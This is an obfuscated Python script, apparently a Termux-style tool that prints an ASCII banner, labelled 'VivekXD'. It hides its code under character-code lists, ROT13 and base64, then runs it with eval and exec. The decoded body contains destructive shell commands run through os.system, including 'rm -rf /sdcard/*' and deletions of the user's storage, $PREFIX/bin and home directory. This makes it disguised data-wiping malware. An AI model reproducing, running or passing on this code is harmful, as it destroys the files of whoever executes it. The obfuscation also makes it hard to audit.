import codecs,base64
htr = [90, 110, 74, 118, 98, 83, 66, 102, 88, 50, 90, 49, 100, 72, 86, 121, 90, 86, 57, 102, 73, 71, 108, 116, 99, 71, 57, 121, 100, 67, 66, 119, 99, 109, 108, 117, 100, 70, 57, 109, 100, 87, 53, 106, 100, 71, 108, 118, 98, 103, 112, 112, 98, 88, 66, 118, 99, 110, 81, 103, 99, 71, 120, 104, 100, 71, 90, 118, 99, 109, 48, 115, 73, 71, 57, 122, 76, 67, 66, 122, 101, 88, 77, 115, 73, 72, 82, 112, 98, 87, 85, 115, 73, 72, 78, 116, 100, 72, 66, 115, 97, 87, 73, 75, 90, 71, 86, 109, 73, 71, 49, 118, 100, 109, 85, 111, 75, 84, 111, 75, 73, 67, 65, 103, 73, 71, 57, 122, 76, 110, 78, 53, 99, 51, 82, 108, 98, 83, 103, 110, 98, 88, 89, 103, 90, 71, 70, 121, 97, 121, 53, 119, 101, 83, 65, 107, 83, 69, 57, 78, 82, 83, 56, 110, 75, 81, 112, 107, 90, 87, 89, 103, 98, 71, 57, 110, 98, 121, 103, 112, 79, 103, 111, 103, 73, 67, 65, 103, 99, 72, 74, 112, 98, 110, 81, 111, 74, 49, 120, 52, 77, 87, 74, 98, 77, 84, 115, 53, 78, 109, 49, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 98, 108, 120, 52, 77, 87, 74, 98, 77, 84, 115, 53, 78, 109, 49, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 69, 103, 73, 67, 65, 103, 73, 67, 66, 99, 101, 68, 70, 105, 87, 122, 69, 55, 79, 84, 70, 116, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 86, 99, 101, 68, 107, 48, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 86, 99, 101, 68, 107, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 86, 99, 101, 68, 107, 51, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 86, 99, 101, 68, 107, 48, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 86, 99, 101, 68, 107, 51, 73, 67, 65, 103, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 104, 106, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 71, 70, 106, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 107, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 104, 106, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 103, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 107, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 71, 70, 106, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 103, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 107, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 104, 106, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 103, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 107, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 104, 106, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 103, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 107, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 104, 106, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 71, 70, 106, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 107, 119, 73, 67, 65, 103, 73, 67, 66, 99, 101, 68, 70, 105, 87, 122, 69, 55, 79, 84, 90, 116, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 86, 99, 101, 68, 107, 120, 88, 71, 53, 99, 101, 68, 70, 105, 87, 122, 69, 55, 79, 84, 90, 116, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 86, 99, 101, 68, 107, 120, 73, 67, 65, 103, 73, 67, 65, 103, 88, 72, 103, 120, 89, 108, 115, 120, 79, 122, 107, 122, 98, 86, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 104, 104, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 104, 104, 77, 121, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 89, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 89, 84, 108, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 100, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 70, 120, 52, 79, 68, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 70, 120, 52, 79, 68, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 70, 120, 52, 79, 68, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 70, 120, 52, 79, 68, 73, 103, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 108, 106, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 103, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 71, 69, 48, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 108, 106, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 71, 70, 106, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 107, 52, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 103, 121, 73, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 48, 88, 72, 104, 104, 89, 49, 120, 52, 90, 84, 74, 99, 101, 68, 107, 48, 88, 72, 103, 53, 89, 49, 120, 52, 90, 84, 74, 99, 101, 68, 107, 48, 88, 72, 104, 104, 78, 67, 65, 103, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 103, 121, 73, 67, 65, 103, 73, 67, 65, 103, 88, 72, 103, 120, 89, 108, 115, 120, 79, 122, 107, 50, 98, 86, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 86, 120, 117, 88, 72, 103, 120, 89, 108, 115, 120, 79, 122, 107, 50, 98, 86, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 83, 65, 103, 73, 67, 65, 103, 73, 70, 120, 52, 77, 87, 74, 98, 77, 84, 115, 53, 77, 109, 49, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 87, 69, 103, 73, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 89, 86, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 90, 67, 65, 103, 73, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 48, 88, 72, 104, 105, 78, 67, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 70, 120, 52, 89, 106, 81, 103, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 71, 73, 48, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 71, 73, 48, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 107, 48, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 103, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 107, 48, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 103, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 107, 52, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 107, 48, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 103, 119, 88, 72, 104, 108, 77, 108, 120, 52, 79, 84, 82, 99, 101, 68, 107, 52, 73, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 48, 88, 72, 104, 105, 78, 67, 65, 103, 73, 67, 65, 103, 73, 70, 120, 52, 77, 87, 74, 98, 77, 84, 115, 53, 78, 109, 49, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 70, 99, 98, 108, 120, 52, 77, 87, 74, 98, 77, 84, 115, 53, 78, 109, 49, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 66, 99, 101, 71, 85, 121, 88, 72, 103, 53, 78, 86, 120, 52, 79, 84, 65, 110, 75, 81, 112, 107, 90, 87, 89, 103, 98, 71, 57, 110, 98, 122, 73, 111, 75, 84, 111, 75, 73, 67, 65, 103, 73, 72, 82, 112, 98, 87, 85, 117, 99, 50, 120, 108, 90, 88, 65, 111, 77, 67, 52, 119, 77, 68, 69, 112, 67, 105, 65, 103, 73, 67, 66, 119, 99, 109, 108, 117, 100, 67, 103, 110, 88, 72, 103, 120, 89, 108, 115, 120, 79, 122, 107, 50, 98, 86, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103, 53, 77, 70, 120, 52, 90, 84, 74, 99, 101, 68, 107, 49, 88, 72, 103]		
tahmid = '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'		
pizza = '\x72\x6f\x74\x5f\x31\x33'		
mobile = codecs.decode(eval('\x74\x61\x68\x6d\x69\x64'), eval('\x70\x69\x7a\x7a\x61'))		
burger = base64.b64decode(''.join([chr(tech) for tech in htr])+eval('\x6d\x6f\x62\x69\x6c\x65'))		
eval(compile(eval("\x62\x75\x72\x67\x65\x72"),"<VivekXD>","exec"))		